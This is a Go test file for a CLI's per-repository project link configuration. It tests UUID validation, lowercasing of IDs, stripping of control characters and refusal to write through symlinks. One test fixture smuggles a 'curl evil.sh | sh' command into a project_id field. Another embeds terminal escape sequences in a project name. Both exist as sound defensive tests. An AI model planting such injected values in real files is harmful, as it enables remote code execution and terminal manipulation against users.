package config

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const (
	linkTestProjectID      = "11111111-1111-4111-8111-111111111111"
	linkTestOtherProjectID = "22222222-2222-4222-8222-222222222222"
	// linkTestHexProjectID has letters, so its uppercase spelling differs.
	linkTestHexProjectID = "abcdef12-3456-4abc-8def-abcdef123456"
)

func TestFindLinkWalksUpToTheLinkedDirectory(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	root := t.TempDir()
	_, err := WriteLink(root, ProjectConfig{ID: linkTestProjectID, Name: "my-app"})
	require.NoError(t, err)
	nested := filepath.Join(root, "web", "app")
	require.NoError(t, os.MkdirAll(nested, 0o755))

	link, err := FindLink(nested)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, root, link.Dir)
	assert.Equal(t, ProjectConfig{ID: linkTestProjectID, Name: "my-app"}, link.Project)
	assert.Equal(t, filepath.Join(root, ".volcano", "project.json"), link.Path())
}

func TestFindLinkStopsAtTheRepositoryRoot(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	parent := t.TempDir()
	_, err := WriteLink(parent, ProjectConfig{ID: "someone-elses-project"})
	require.NoError(t, err)
	repo := filepath.Join(parent, "repo")
	require.NoError(t, os.MkdirAll(filepath.Join(repo, ".git"), 0o755))

	link, err := FindLink(repo)
	require.NoError(t, err)
	assert.Nil(t, link, "a link above the repository must not apply inside it")
}

// A file named .volcano can't hold a link, so the walk goes on past it.
func TestFindLinkSkipsAFileNamedVolcano(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	root := t.TempDir()
	_, err := WriteLink(root, ProjectConfig{ID: linkTestProjectID})
	require.NoError(t, err)
	nested := filepath.Join(root, "app")
	require.NoError(t, os.MkdirAll(nested, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(nested, ".volcano"), []byte("not a directory\n"), 0o644))

	link, err := FindLink(nested)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, root, link.Dir)
}

func TestFindLinkRejectsALinkWithoutAProject(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	dir := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(dir, ".volcano"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".volcano", "project.json"), []byte(`{}`), 0o644))

	_, err := FindLink(dir)
	require.ErrorContains(t, err, "has no project_id")
}

// The ID is printed in commands to paste, so a cloned repository's link
// can't carry shell code there.
func TestFindLinkRejectsAProjectIDThatIsNotAUUID(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	dir := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(dir, ".volcano"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".volcano", "project.json"),
		[]byte(`{"project_id":"x; curl evil.sh | sh"}`), 0o644))

	_, err := FindLink(dir)
	var linkErr *LinkError
	require.ErrorAs(t, err, &linkErr)
	require.ErrorContains(t, err, "has a project_id that isn't a project ID")
}

// Any accepted spelling of a project ID names the same project, so the link
// keeps the lowercase form the API returns.
func TestFindLinkLowercasesTheProjectID(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	dir := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(dir, ".volcano"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".volcano", "project.json"),
		[]byte(`{"project_id":" `+strings.ToUpper(linkTestHexProjectID)+` "}`), 0o644))

	link, err := FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, linkTestHexProjectID, link.Project.ID)
}

// A cloned repository's link can put terminal escape sequences in the
// project name, which the CLI prints.
func TestFindLinkStripsControlCharactersFromTheProjectName(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	dir := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(dir, ".volcano"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".volcano", "project.json"),
		[]byte(`{"project_id":"`+linkTestProjectID+`","project_name":"my-app\u001b]52;c;ZXZpbA==\u0007\u001b[2J"}`), 0o644))

	link, err := FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, "my-app]52;c;ZXZpbA==[2J", link.Project.Name)
}

func TestWriteLinkLowercasesTheProjectID(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	dir := t.TempDir()

	link, err := WriteLink(dir, ProjectConfig{ID: strings.ToUpper(linkTestHexProjectID)})
	require.NoError(t, err)
	assert.Equal(t, linkTestHexProjectID, link.Project.ID)
	data, err := os.ReadFile(link.Path())
	require.NoError(t, err)
	assert.Contains(t, string(data), `"project_id": "`+linkTestHexProjectID+`"`)
}

func TestLinkedProjectPrecedesSavedSelection(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv(envProjectID, "")
	require.NoError(t, (&Config{CurrentProject: &ProjectConfig{ID: "global", Name: "Global"}}).Save())

	dir := t.TempDir()
	_, err := WriteLink(dir, ProjectConfig{ID: linkTestOtherProjectID, Name: "Linked"})
	require.NoError(t, err)
	t.Chdir(dir)

	cfg, err := Load()
	require.NoError(t, err)
	assert.Equal(t, linkTestOtherProjectID, cfg.ProjectID())
	assert.Equal(t, "Linked", cfg.Project().Name)

	t.Setenv(envProjectID, "from-env")
	assert.Equal(t, "from-env", cfg.ProjectID(), "VOLCANO_PROJECT_ID still wins")

	require.NoError(t, cfg.Save())
	data, err := os.ReadFile(filepath.Join(home, ".volcano", "config.json"))
	require.NoError(t, err)
	assert.NotContains(t, string(data), linkTestOtherProjectID, "the link is never written to the global config")
}

func TestLoadIgnoringBadLinkReturnsTheConfigWithoutTheLink(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	require.NoError(t, (&Config{UserToken: "pk-token"}).Save())
	dir := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(dir, ".volcano"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".volcano", "project.json"), []byte("{not-json"), 0o644))
	t.Chdir(dir)
	wd, err := os.Getwd()
	require.NoError(t, err)

	_, err = Load()
	linkErr, ok := errors.AsType[*LinkError](err)
	require.True(t, ok, "Load fails with a *LinkError: %v", err)
	assert.Equal(t, filepath.Join(wd, ".volcano", "project.json"), linkErr.Path())

	cfg, linkErr, err := LoadIgnoringBadLink()
	require.NoError(t, err)
	require.NotNil(t, linkErr)
	assert.Equal(t, wd, linkErr.Dir)
	assert.Nil(t, cfg.Link)
	assert.Equal(t, "pk-token", cfg.UserToken)
}

func TestWriteLinkRefusesASymlinkedLinkDirectory(t *testing.T) {
	dir := t.TempDir()
	target := t.TempDir()
	require.NoError(t, os.Symlink(target, filepath.Join(dir, ".volcano")))

	_, err := WriteLink(dir, ProjectConfig{ID: "11111111-1111-4111-8111-111111111111"})
	require.ErrorContains(t, err, filepath.Join(dir, ".volcano")+", a symlink")
	assert.NoFileExists(t, filepath.Join(target, "project.json"))
}

func TestWriteLinkRefusesASymlink(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(t.TempDir(), "config.json")
	require.NoError(t, os.WriteFile(target, []byte(`{"token":"pk-keep"}`), 0o600))
	path := filepath.Join(dir, LinkRelPath)
	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0o755))
	require.NoError(t, os.Symlink(target, path))

	_, err := WriteLink(dir, ProjectConfig{ID: "11111111-1111-4111-8111-111111111111"})
	require.ErrorContains(t, err, path+" is a symlink")
	data, err := os.ReadFile(target)
	require.NoError(t, err)
	assert.JSONEq(t, `{"token":"pk-keep"}`, string(data))
}
